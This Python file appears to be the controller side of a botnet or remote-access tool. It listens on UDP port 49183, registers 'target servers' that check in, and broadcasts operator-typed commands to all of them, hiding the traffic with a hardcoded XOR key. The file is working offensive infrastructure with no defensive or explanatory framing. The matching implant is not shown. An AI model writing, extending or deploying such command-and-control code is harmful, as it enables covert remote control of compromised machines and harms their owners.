import socket
import threading

SECRET_KEY = b'SECRETKEYCHANGEXOR'

control_server_host = '0.0.0.0'
control_server_port = 49183

def xor_encrypt_decrypt(data):
    return bytes([data[i] ^ SECRET_KEY[i % len(SECRET_KEY)] for i in range(len(data))])

def send_command_to_target(command, address):
    encrypted_command = xor_encrypt_decrypt(command.encode())
    try:
        control_socket.sendto(encrypted_command, address)
    except Exception as e:
        print(f"Error sending command to target server: {e}")

def handle_target_messages():
    while True:
        data, address = control_socket.recvfrom(1024)
        if data:
            decrypted_data = xor_encrypt_decrypt(data)
            msg = decrypted_data.decode()
            if msg == "TARGET_CONNECTED":
                target_addresses.add(address)
                print(f"New target server connected: {address}")
            print(f"Received from {address}: {msg}")

def user_input():
    while True:
        command = input("Enter command: ")
        if target_addresses:
            for address in target_addresses:
                send_command_to_target(command, address)
        else:
            print("No known target addresses.")

if __name__ == '__main__':
    target_addresses = set()

    control_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    control_socket.bind((control_server_host, control_server_port))

    print("Control Server is listening for target servers...")

    threading.Thread(target=handle_target_messages, daemon=True).start()
    threading.Thread(target=user_input, daemon=True).start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Control Server shutting down...")
        control_socket.close()
